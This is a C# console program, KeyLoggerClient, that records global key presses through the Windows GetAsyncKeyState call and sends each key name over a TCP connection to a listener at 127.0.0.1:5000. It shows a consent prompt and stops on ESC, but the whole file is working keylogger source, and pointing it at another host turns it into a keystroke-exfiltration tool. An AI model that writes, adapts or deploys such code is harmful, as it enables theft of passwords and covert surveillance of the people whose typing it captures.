using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLoggerClient
{
    class Program
    {
        // Import GetAsyncKeyState from user32.dll
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        static void Main(string[] args)
        {
            // Transparency message
            Console.WriteLine("WARNING: This program will log all key presses.");
            Console.Write("Do you want to continue? (yes/no): ");
            string input = Console.ReadLine();

            if (input?.ToLower() != "yes")
            {
                Console.WriteLine("Exiting program.");
                return;
            }

            Console.WriteLine("Keylogger is now running. Press 'ESC' to stop.");

            // Connect to the TCP server (ex. localhost:5000)
            using TcpClient client = new TcpClient("127.0.0.1", 5000);
            using NetworkStream stream = client.GetStream();

            RunKeylogger(stream);
        }

        static bool KeyIsPressed(short key)
        {
            return (key & 0x8000) != 0;
        }

        static void RunKeylogger(NetworkStream stream)
        {
            bool[] keyStates = new bool[256];

            while (true)
            {
                for (int vKey = 0; vKey < 256; vKey++)
                {
                    short keyState = GetAsyncKeyState(vKey);

                    if (KeyIsPressed(keyState) && !keyStates[vKey])
                    {
                        string key = ((ConsoleKey)vKey).ToString();
                        byte[] data = System.Text.Encoding.ASCII.GetBytes(key + " ");

                        stream.Write(data, 0, data.Length);

                        keyStates[vKey] = true;

                        if (key == "Escape")
                        {
                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
                            return;
                        }
                    }
                    else if (!KeyIsPressed(keyState))
                    {
                        keyStates[vKey] = false;
                    }
                }

                Thread.Sleep(10);
            }
        }
    }
}
